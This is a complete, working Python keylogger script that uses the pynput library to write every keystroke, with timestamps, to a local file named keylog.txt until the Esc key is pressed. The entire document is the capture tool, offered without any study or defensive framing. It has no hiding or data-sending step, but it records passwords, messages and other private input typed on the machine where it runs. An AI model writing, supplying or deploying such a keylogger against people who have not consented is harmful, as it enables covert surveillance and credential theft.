from pynput.keyboard import Key, Listener
import logging

# Setting up the log file and format
log_dir = ""
logging.basicConfig(filename=(log_dir + "keylog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log keystrokes
def on_press(key):
    try:
        logging.info(str(key))
    except AttributeError:
        logging.info('Special key {0} pressed'.format(key))

# Function to handle when a key is released
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Setting up the listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
